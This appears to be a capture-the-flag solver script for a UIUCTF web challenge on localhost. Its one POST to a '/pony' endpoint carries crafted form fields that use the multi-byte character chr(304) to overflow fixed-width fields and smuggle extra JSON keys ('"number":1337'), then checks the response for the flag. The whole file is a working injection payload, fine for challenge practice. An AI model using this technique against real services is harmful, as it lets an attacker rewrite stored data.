#!/usr/bin/env python3
import requests

URL = 'http://localhost:1337'
s = requests.Session()
s.get(URL)
res = s.post(URL+'/pony', data={"name": "asdf", "bio": "asdf", "image": "asdf", "favorite_key": chr(304)*64, "favorite_value": '","number":1337,"":"'.ljust(64), "word": chr(304)*23+'_"}', "number": 0})
if b"uiuctf{" in res.content:
    exit(0)
else:
    exit(1)
